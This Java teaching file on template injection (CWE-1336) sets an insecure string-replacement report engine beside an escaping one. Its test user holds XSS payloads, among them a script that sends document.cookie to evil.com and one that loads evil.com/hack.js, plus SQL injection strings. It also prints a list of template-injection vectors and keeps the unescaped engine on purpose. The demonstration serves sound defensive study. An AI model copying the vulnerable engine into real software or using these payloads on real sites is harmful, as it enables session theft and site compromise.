package deepseek.java;

import java.io.*;
import java.nio.file.*;
import java.time.*;
import java.time.format.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.regex.*;
import org.owasp.encoder.Encode;

// Note: This example uses OWASP Encoder for demonstration
// In a real project, you would need to include esapi-2.5.1.0.jar or similar

public class cwe_1336 {

    // ==================== DATA CLASSES ====================

    static class User {
        private final String userId;
        private final String username;
        private final String fullName;
        private final String email;
        private final String role;
        private final List<Activity> activities;
        private final Map<String, Object> preferences;

        public User(String userId, String username, String fullName, String email, String role) {
            this.userId = userId;
            this.username = username;
            this.fullName = fullName;
            this.email = email;
            this.role = role;
            this.activities = new ArrayList<>();
            this.preferences = new HashMap<>();
        }

        public String getUserId() {
            return userId;
        }

        public String getUsername() {
            return username;
        }

        public String getFullName() {
            return fullName;
        }

        public String getEmail() {
            return email;
        }

        public String getRole() {
            return role;
        }

        public List<Activity> getActivities() {
            return activities;
        }

        public Map<String, Object> getPreferences() {
            return preferences;
        }

        public void addActivity(Activity activity) {
            activities.add(activity);
        }
    }

    static class Activity {
        private final String type;
        private final String description;
        private final LocalDateTime timestamp;
        private final Map<String, String> metadata;

        public Activity(String type, String description) {
            this.type = type;
            this.description = description;
            this.timestamp = LocalDateTime.now();
            this.metadata = new HashMap<>();
        }

        public String getType() {
            return type;
        }

        public String getDescription() {
            return description;
        }

        public LocalDateTime getTimestamp() {
            return timestamp;
        }

        public Map<String, String> getMetadata() {
            return metadata;
        }

        public String getFormattedTimestamp() {
            return timestamp.format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));
        }
    }

    // ==================== INSECURE TEMPLATE ENGINE (CWE-1336 VULNERABLE)
    // ====================

    static class InsecureTemplateEngine {

        private final String template;

        public InsecureTemplateEngine(String templatePath) throws IOException {
            this.template = Files.readString(Paths.get(templatePath));
        }

        // INSECURE: Direct string replacement without escaping
        public String generateReport(User user) {
            System.out.println("\n[INSECURE] Generating report for: " + user.getUsername());

            String report = template;

            // INSECURE: Simple string replacement - no escaping!
            report = report.replace("{{USERNAME}}", user.getUsername());
            report = report.replace("{{FULL_NAME}}", user.getFullName());
            report = report.replace("{{EMAIL}}", user.getEmail());
            report = report.replace("{{ROLE}}", user.getRole());

            // INSECURE: Activity list generation with unescaped content
            StringBuilder activitiesHtml = new StringBuilder();
            for (Activity activity : user.getActivities()) {
                // INSECURE: Direct concatenation of user-controlled content
                activitiesHtml.append("<tr>")
                        .append("<td>").append(activity.getType()).append("</td>")
                        .append("<td>").append(activity.getDescription()).append("</td>")
                        .append("<td>").append(activity.getFormattedTimestamp()).append("</td>")
                        .append("</tr>");
            }

            report = report.replace("{{ACTIVITIES}}", activitiesHtml.toString());

            // INSECURE: User preferences with potential script injection
            StringBuilder prefsHtml = new StringBuilder();
            for (Map.Entry<String, Object> pref : user.getPreferences().entrySet()) {
                // INSECURE: No escaping of keys or values
                prefsHtml.append("<div class='pref'>")
                        .append("<span class='key'>").append(pref.getKey()).append("</span>: ")
                        .append("<span class='value'>").append(pref.getValue()).append("</span>")
                        .append("</div>");
            }

            report = report.replace("{{PREFERENCES}}", prefsHtml.toString());

            return report;
        }

        // INSECURE: Custom template function with no escaping
        public String generateCustomReport(User user, String customHeader) {
            String report = template;

            // INSECURE: Direct insertion of user-controlled header
            report = report.replace("{{CUSTOM_HEADER}}", customHeader);

            // INSECURE: The rest of the replacement as above
            return generateReport(user).replace("{{CUSTOM_HEADER}}", customHeader);
        }

        // INSECURE: JSON data injection
        public String generateJsonReport(User user) {
            StringBuilder json = new StringBuilder();
            json.append("{\n");
            json.append("  \"username\": \"").append(user.getUsername()).append("\",\n");
            json.append("  \"email\": \"").append(user.getEmail()).append("\",\n");
            json.append("  \"activities\": [\n");

            for (int i = 0; i < user.getActivities().size(); i++) {
                Activity a = user.getActivities().get(i);
                json.append("    {\n");
                // INSECURE: No JSON escaping
                json.append("      \"type\": \"").append(a.getType()).append("\",\n");
                json.append("      \"description\": \"").append(a.getDescription()).append("\"\n");
                json.append("    }");
                if (i < user.getActivities().size() - 1) {
                    json.append(",");
                }
                json.append("\n");
            }

            json.append("  ]\n");
            json.append("}");

            return json.toString();
        }
    }

    // ==================== SECURE TEMPLATE ENGINE (CWE-1336 MITIGATED)
    // ====================

    static class SecureTemplateEngine {

        private final String template;

        // HTML escaping patterns
        private static final Map<Character, String> HTML_ESCAPES = new HashMap<>();
        static {
            HTML_ESCAPES.put('&', "&amp;");
            HTML_ESCAPES.put('<', "&lt;");
            HTML_ESCAPES.put('>', "&gt;");
            HTML_ESCAPES.put('"', "&quot;");
            HTML_ESCAPES.put('\'', "&#x27;");
            HTML_ESCAPES.put('/', "&#x2F;");
        }

        // JavaScript escaping patterns
        private static final Map<Character, String> JS_ESCAPES = new HashMap<>();
        static {
            JS_ESCAPES.put('\\', "\\\\");
            JS_ESCAPES.put('\'', "\\'");
            JS_ESCAPES.put('"', "\\\"");
            JS_ESCAPES.put('\n', "\\n");
            JS_ESCAPES.put('\r', "\\r");
            JS_ESCAPES.put('\t', "\\t");
            JS_ESCAPES.put('<', "\\x3C");
            JS_ESCAPES.put('>', "\\x3E");
        }

        // Validation patterns
        private static final Pattern USERNAME_PATTERN = Pattern.compile("^[a-zA-Z0-9_]{3,20}$");
        private static final Pattern EMAIL_PATTERN = Pattern
                .compile("^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$");

        public SecureTemplateEngine(String templatePath) throws IOException {
            this.template = Files.readString(Paths.get(templatePath));
        }

        // SECURE: HTML escape function
        private String escapeHtml(String input) {
            if (input == null)
                return "";

            StringBuilder escaped = new StringBuilder();
            for (char c : input.toCharArray()) {
                String replacement = HTML_ESCAPES.get(c);
                if (replacement != null) {
                    escaped.append(replacement);
                } else {
                    escaped.append(c);
                }
            }
            return escaped.toString();
        }

        // SECURE: JavaScript escape function
        private String escapeJavaScript(String input) {
            if (input == null)
                return "";

            StringBuilder escaped = new StringBuilder();
            for (char c : input.toCharArray()) {
                String replacement = JS_ESCAPES.get(c);
                if (replacement != null) {
                    escaped.append(replacement);
                } else if (c < 0x20) {
                    escaped.append(String.format("\\x%02X", (int) c));
                } else {
                    escaped.append(c);
                }
            }
            return escaped.toString();
        }

        // SECURE: JSON escape function
        private String escapeJson(String input) {
            if (input == null)
                return "";

            StringBuilder escaped = new StringBuilder();
            for (char c : input.toCharArray()) {
                switch (c) {
                    case '"':
                        escaped.append("\\\"");
                        break;
                    case '\\':
                        escaped.append("\\\\");
                        break;
                    case '/':
                        escaped.append("\\/");
                        break;
                    case '\b':
                        escaped.append("\\b");
                        break;
                    case '\f':
                        escaped.append("\\f");
                        break;
                    case '\n':
                        escaped.append("\\n");
                        break;
                    case '\r':
                        escaped.append("\\r");
                        break;
                    case '\t':
                        escaped.append("\\t");
                        break;
                    default:
                        if (c < 0x20) {
                            escaped.append(String.format("\\u%04X", (int) c));
                        } else {
                            escaped.append(c);
                        }
                }
            }
            return escaped.toString();
        }

        // SECURE: Validate username
        private boolean validateUsername(String username) {
            return username != null && USERNAME_PATTERN.matcher(username).matches();
        }

        // SECURE: Validate email
        private boolean validateEmail(String email) {
            return email != null && EMAIL_PATTERN.matcher(email).matches();
        }

        // SECURE: Generate report with proper escaping
        public String generateReport(User user) {
            System.out.println("\n[SECURE] Generating report for: " + user.getUsername());

            String report = template;

            // SECURE: Escape all user-provided content
            report = report.replace("{{USERNAME}}", escapeHtml(user.getUsername()));
            report = report.replace("{{FULL_NAME}}", escapeHtml(user.getFullName()));
            report = report.replace("{{EMAIL}}", escapeHtml(user.getEmail()));
            report = report.replace("{{ROLE}}", escapeHtml(user.getRole()));

            // SECURE: Activity list with escaping
            StringBuilder activitiesHtml = new StringBuilder();
            for (Activity activity : user.getActivities()) {
                activitiesHtml.append("<tr>")
                        .append("<td>").append(escapeHtml(activity.getType())).append("</td>")
                        .append("<td>").append(escapeHtml(activity.getDescription())).append("</td>")
                        .append("<td>").append(escapeHtml(activity.getFormattedTimestamp())).append("</td>")
                        .append("</tr>");
            }

            report = report.replace("{{ACTIVITIES}}", activitiesHtml.toString());

            // SECURE: User preferences with escaping
            StringBuilder prefsHtml = new StringBuilder();
            for (Map.Entry<String, Object> pref : user.getPreferences().entrySet()) {
                prefsHtml.append("<div class='pref'>")
                        .append("<span class='key'>").append(escapeHtml(pref.getKey())).append("</span>: ")
                        .append("<span class='value'>").append(escapeHtml(String.valueOf(pref.getValue())))
                        .append("</span>")
                        .append("</div>");
            }

            report = report.replace("{{PREFERENCES}}", prefsHtml.toString());

            return report;
        }

        // SECURE: Custom report with header validation
        public String generateCustomReport(User user, String customHeader) {
            // SECURE: Validate and escape custom header
            if (customHeader == null || customHeader.length() > 100) {
                customHeader = "Default Header";
            }

            String escapedHeader = escapeHtml(customHeader);
            String report = generateReport(user);
            return report.replace("{{CUSTOM_HEADER}}", escapedHeader);
        }

        // SECURE: JSON report with proper JSON escaping
        public String generateJsonReport(User user) {
            StringBuilder json = new StringBuilder();
            json.append("{\n");
            json.append("  \"username\": \"").append(escapeJson(user.getUsername())).append("\",\n");
            json.append("  \"email\": \"").append(escapeJson(user.getEmail())).append("\",\n");
            json.append("  \"activities\": [\n");

            for (int i = 0; i < user.getActivities().size(); i++) {
                Activity a = user.getActivities().get(i);
                json.append("    {\n");
                json.append("      \"type\": \"").append(escapeJson(a.getType())).append("\",\n");
                json.append("      \"description\": \"").append(escapeJson(a.getDescription())).append("\",\n");
                json.append("      \"timestamp\": \"").append(escapeJson(a.getFormattedTimestamp())).append("\"\n");
                json.append("    }");
                if (i < user.getActivities().size() - 1) {
                    json.append(",");
                }
                json.append("\n");
            }

            json.append("  ]\n");
            json.append("}");

            return json.toString();
        }

        // SECURE: Generate CSV report (different escaping)
        public String generateCsvReport(User user) {
            StringBuilder csv = new StringBuilder();
            csv.append("Type,Description,Timestamp\n");

            for (Activity activity : user.getActivities()) {
                // SECURE: CSV escaping (quotes and commas)
                csv.append(escapeCsv(activity.getType())).append(",");
                csv.append(escapeCsv(activity.getDescription())).append(",");
                csv.append(escapeCsv(activity.getFormattedTimestamp())).append("\n");
            }

            return csv.toString();
        }

        private String escapeCsv(String input) {
            if (input == null)
                return "";
            if (input.contains(",") || input.contains("\"") || input.contains("\n")) {
                return "\"" + input.replace("\"", "\"\"") + "\"";
            }
            return input;
        }
    }

    // ==================== TEMPLATE CREATION ====================

    static class TemplateCreator {

        public static void createTemplate(String path) throws IOException {
            String template = """
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <title>User Activity Report - {{USERNAME}}</title>
                        <style>
                            body { font-family: Arial, sans-serif; margin: 20px; }
                            .header { background: #4CAF50; color: white; padding: 20px; border-radius: 5px; }
                            .user-info { background: #f5f5f5; padding: 15px; margin: 20px 0; border-radius: 5px; }
                            .activities { margin: 20px 0; }
                            table { width: 100%%; border-collapse: collapse; }
                            th, td { padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }
                            th { background-color: #4CAF50; color: white; }
                            .preferences { background: #e8f5e9; padding: 15px; border-radius: 5px; margin: 20px 0; }
                            .pref { margin: 5px 0; }
                            .key { font-weight: bold; color: #2E7D32; }
                            .footer { text-align: center; margin-top: 30px; color: #666; }
                            {{CUSTOM_HEADER}}
                        </style>
                    </head>
                    <body>
                        <div class='header'>
                            <h1>Activity Report for {{FULL_NAME}}</h1>
                        </div>

                        <div class='user-info'>
                            <h3>User Information</h3>
                            <p><strong>Username:</strong> {{USERNAME}}</p>
                            <p><strong>Email:</strong> {{EMAIL}}</p>
                            <p><strong>Role:</strong> {{ROLE}}</p>
                        </div>

                        <div class='activities'>
                            <h3>Recent Activities</h3>
                            <table>
                                <thead>
                                    <tr>
                                        <th>Type</th>
                                        <th>Description</th>
                                        <th>Timestamp</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    {{ACTIVITIES}}
                                </tbody>
                            </table>
                        </div>

                        <div class='preferences'>
                            <h3>User Preferences</h3>
                            {{PREFERENCES}}
                        </div>

                        <div class='footer'>
                            <p>Report generated on {{GENERATED_DATE}}</p>
                        </div>
                    </body>
                    </html>
                    """;

            Files.writeString(Paths.get(path), template);
        }
    }

    // ==================== DEMONSTRATION CLASS ====================

    static class TemplateDemonstrator {

        public static void demonstrateInsecureTemplate() throws IOException {
            System.out.println("\n" + "=".repeat(60));
            System.out.println("INSECURE TEMPLATE ENGINE (CWE-1336)");
            System.out.println("=".repeat(60));

            // Create test user with malicious input
            User maliciousUser = createMaliciousUser();

            InsecureTemplateEngine engine = new InsecureTemplateEngine("report_template.html");

            System.out.println("\n🔴 Generating report with malicious input...");
            String report = engine.generateReport(maliciousUser);

            // Show the dangerous parts
            System.out.println("\nMalicious username: " + maliciousUser.getUsername());
            System.out.println("Malicious activity: " + maliciousUser.getActivities().get(0).getDescription());

            System.out.println("\n🔴 Extracted script from generated HTML:");
            extractAndShowScript(report);

            // Show JSON injection
            System.out.println("\n🔴 JSON injection example:");
            String json = engine.generateJsonReport(maliciousUser);
            System.out.println(json);
        }

        public static void demonstrateSecureTemplate() throws IOException {
            System.out.println("\n" + "=".repeat(60));
            System.out.println("SECURE TEMPLATE ENGINE (MITIGATED)");
            System.out.println("=".repeat(60));

            // Create test user with malicious input
            User maliciousUser = createMaliciousUser();

            SecureTemplateEngine engine = new SecureTemplateEngine("report_template.html");

            System.out.println("\n✅ Generating report with escaped malicious input...");
            String report = engine.generateReport(maliciousUser);

            // Show that malicious content is escaped
            System.out.println("\nEscaped username: " + escapePreview(
                    maliciousUser.getUsername()));
            System.out.println("Escaped activity: " + escapePreview(
                    maliciousUser.getActivities().get(0).getDescription()));

            System.out.println("\n✅ Checking for scripts in generated HTML:");
            boolean hasScripts = checkForScripts(report);
            System.out.println("  Scripts found: " + hasScripts);

            // Show safe JSON
            System.out.println("\n✅ Safe JSON generation:");
            String json = engine.generateJsonReport(maliciousUser);
            System.out.println(json);
        }

        private static User createMaliciousUser() {
            User user = new User("U001",
                    "<script>alert('XSS')</script>",
                    "John Doe <img src=x onerror=alert(1)>",
                    "john@example.com'> <script>fetch('https://evil.com?cookie='+document.cookie)</script>",
                    "ADMIN' OR '1'='1");

            // Add malicious activity
            Activity activity = new Activity(
                    "LOGIN <script>alert('hacked')</script>",
                    "User logged in from <script src='https://evil.com/hack.js'></script>");
            activity.getMetadata().put("ip", "'; DROP TABLE users; --");
            user.addActivity(activity);

            // Add malicious preferences
            user.getPreferences().put("theme", "dark' onload='alert(1)'");
            user.getPreferences().put("language", "<script>eval(localStorage.getItem('data'))</script>");

            return user;
        }

        private static void extractAndShowScript(String html) {
            Pattern scriptPattern = Pattern.compile("<script>.*?</script>", Pattern.DOTALL);
            Matcher matcher = scriptPattern.matcher(html);

            while (matcher.find()) {
                System.out.println("  Found: " + matcher.group());
            }
        }

        private static String escapePreview(String input) {
            return input.replace("<", "&lt;").replace(">", "&gt;");
        }

        private static boolean checkForScripts(String html) {
            return html.contains("<script>") ||
                    html.contains("onload=") ||
                    html.contains("onerror=") ||
                    html.contains("javascript:");
        }

        public static void compareApproaches() throws IOException {
            System.out.println("\n" + "=".repeat(60));
            System.out.println("APPROACH COMPARISON");
            System.out.println("=".repeat(60));

            User testUser = createMaliciousUser();
            InsecureTemplateEngine insecure = new InsecureTemplateEngine("report_template.html");
            SecureTemplateEngine secure = new SecureTemplateEngine("report_template.html");

            System.out.println("\n📊 INJECTION ATTEMPTS:");
            System.out.println("  Username: " + testUser.getUsername());
            System.out.println("  Activity: " + testUser.getActivities().get(0).getDescription());

            System.out.println("\n🔴 INSECURE RESULT:");
            String insecureReport = insecure.generateReport(testUser);
            System.out.println("  Contains unescaped scripts: " + insecureReport.contains("<script>"));
            System.out.println("  XSS vulnerable: YES");

            System.out.println("\n✅ SECURE RESULT:");
            String secureReport = secure.generateReport(testUser);
            System.out.println("  Contains escaped scripts: " + secureReport.contains("&lt;script&gt;"));
            System.out.println("  XSS vulnerable: NO");
        }
    }

    // ==================== MAIN APPLICATION ====================

    public static void main(String[] args) {
        System.out.println("================================================");
        System.out.println("CWE-1336: Template Injection");
        System.out.println("================================================\n");

        try {
            // Create template file
            TemplateCreator.createTemplate("report_template.html");
            System.out.println("[✓] Template file created: report_template.html");

        } catch (IOException e) {
            System.err.println("Failed to create template: " + e.getMessage());
            return;
        }

        Scanner scanner = new Scanner(System.in);

        while (true) {
            System.out.println("\n" + "-".repeat(60));
            System.out.println("MENU:");
            System.out.println("  1. Demonstrate INSECURE template engine (CWE-1336)");
            System.out.println("  2. Demonstrate SECURE template engine (Mitigated)");
            System.out.println("  3. Compare approaches");
            System.out.println("  4. Test custom template injection");
            System.out.println("  5. Show security analysis");
            System.out.println("  6. Exit");
            System.out.print("\nSelect option: ");

            String choice = scanner.nextLine().trim();

            try {
                switch (choice) {
                    case "1":
                        TemplateDemonstrator.demonstrateInsecureTemplate();
                        break;

                    case "2":
                        TemplateDemonstrator.demonstrateSecureTemplate();
                        break;

                    case "3":
                        TemplateDemonstrator.compareApproaches();
                        break;

                    case "4":
                        testCustomInjection(scanner);
                        break;

                    case "5":
                        showSecurityAnalysis();
                        break;

                    case "6":
                        System.out.println("\nExiting...");
                        cleanup();
                        scanner.close();
                        return;

                    default:
                        System.out.println("[!] Invalid option");
                }
            } catch (IOException e) {
                System.err.println("Error: " + e.getMessage());
            }
        }
    }

    private static void testCustomInjection(Scanner scanner) throws IOException {
        System.out.println("\n" + "=".repeat(60));
        System.out.println("CUSTOM INJECTION TEST");
        System.out.println("=".repeat(60));

        System.out.print("\nEnter your name (try XSS): ");
        String name = scanner.nextLine().trim();

        System.out.print("Enter custom header (try script injection): ");
        String header = scanner.nextLine().trim();

        User testUser = new User("U002", name, name + " Full", name + "@example.com", "USER");
        testUser.addActivity(new Activity("TEST", "Test activity from " + name));

        SecureTemplateEngine secure = new SecureTemplateEngine("report_template.html");
        InsecureTemplateEngine insecure = new InsecureTemplateEngine("report_template.html");

        System.out.println("\n🔴 INSECURE RESULT (vulnerable):");
        String insecureReport = insecure.generateCustomReport(testUser, header);
        System.out.println("  Contains scripts: " + insecureReport.contains("<script>"));

        System.out.println("\n✅ SECURE RESULT (protected):");
        String secureReport = secure.generateCustomReport(testUser, header);
        System.out.println("  Contains scripts: " + secureReport.contains("<script>"));
    }

    private static void showSecurityAnalysis() {
        System.out.println("\n" + "=".repeat(60));
        System.out.println("SECURITY ANALYSIS - CWE-1336");
        System.out.println("=".repeat(60));

        System.out.println("\n🔴 INSECURE IMPLEMENTATION (CWE-1336 VULNERABLE):");
        System.out.println("  1. Direct String Replacement:");
        System.out.println("     • No escaping of user input");
        System.out.println("     • HTML/JavaScript injection possible");
        System.out.println("     • Template injection attacks");

        System.out.println("\n  2. Common Injection Vectors:");
        System.out.println("     • <script>alert('XSS')</script>");
        System.out.println("     • <img src=x onerror=alert(1)>");
        System.out.println("     • {{constructor.constructor('alert(1)')()}}");
        System.out.println("     • ${7*7} (EL injection)");

        System.out.println("\n  3. Consequences:");
        System.out.println("     • Cross-Site Scripting (XSS)");
        System.out.println("     • Data theft");
        System.out.println("     • Session hijacking");
        System.out.println("     • Defacement");

        System.out.println("\n✅ SECURE IMPLEMENTATION (MITIGATED):");
        System.out.println("  1. Context-Aware Escaping:");
        System.out.println("     • HTML escaping for HTML context");
        System.out.println("     • JavaScript escaping for script context");
        System.out.println("     • CSS escaping for style context");
        System.out.println("     • URL escaping for href/src");

        System.out.println("\n  2. Input Validation:");
        System.out.println("     • Validate format before insertion");
        System.out.println("     • Reject malicious patterns");
        System.out.println("     • Length limits");

        System.out.println("\n  3. Safe Templating:");
        System.out.println("     • Use proper template engines");
        System.out.println("     • Auto-escaping by default");
        System.out.println("     • Context-aware encoding");

        System.out.println("\n📋 BEST PRACTICES:");
        System.out.println("  1. Never use string concatenation for templates");
        System.out.println("  2. Use a proper template engine with auto-escaping");
        System.out.println("  3. Apply context-appropriate encoding");
        System.out.println("  4. Validate and sanitize all user input");
        System.out.println("  5. Use Content Security Policy (CSP)");
        System.out.println("  6. Implement output encoding");
        System.out.println("  7. Consider using OWASP Encoder");
        System.out.println("  8. Regular security testing");

        System.out.println("\n🎯 RECOMMENDATION:");
        System.out.println("  • Use Thymeleaf, Freemarker, or JSP with auto-escaping");
        System.out.println("  • Always escape based on context");
        System.out.println("  • Implement Content Security Policy");
        System.out.println("  • Use OWASP Java Encoder");

        System.out.println("\n🔧 CODE COMPARISON:");
        System.out.println("  // INSECURE");
        System.out.println("  String html = \"<div>\" + userInput + \"</div>\";");
        System.out.println("");
        System.out.println("  // SECURE (manual)");
        System.out.println("  String safe = userInput.replace(\"&\", \"&amp;\")");
        System.out.println("                       .replace(\"<\", \"&lt;\")");
        System.out.println("                       .replace(\">\", \"&gt;\");");
        System.out.println("  String html = \"<div>\" + safe + \"</div>\";");
        System.out.println("");
        System.out.println("  // SECURE (OWASP Encoder)");
        System.out.println("  String html = \"<div>\" + Encode.forHtml(userInput) + \"</div>\";");

        System.out.println("\n📊 ESCAPING CONTEXTS:");
        System.out.println("  Context      | Escaping Method        | Example");
        System.out.println("  -------------|------------------------|---------");
        System.out.println("  HTML body    | HTML entity encoding  | &lt;div&gt;");
        System.out.println("  HTML attribute| HTML attribute encoding| &quot;value&quot;");
        System.out.println("  JavaScript  | JavaScript escaping   | \\'alert\\'");
        System.out.println("  CSS         | CSS escaping          | \\0027");
        System.out.println("  URL         | URL encoding          | %3Cscript%3E");
        System.out.println("  JSON        | JSON escaping         | \\u003C");

        System.out.println("\n⚠️ REMEMBER: Context is everything in output encoding!");
        System.out.println("  What works for HTML may fail for JavaScript or URLs.");
    }

    private static void cleanup() {
        try {
            Files.deleteIfExists(Paths.get("report_template.html"));
            System.out.println("Template file cleaned up");
        } catch (IOException e) {
            System.err.println("Cleanup error: " + e.getMessage());
        }
    }
}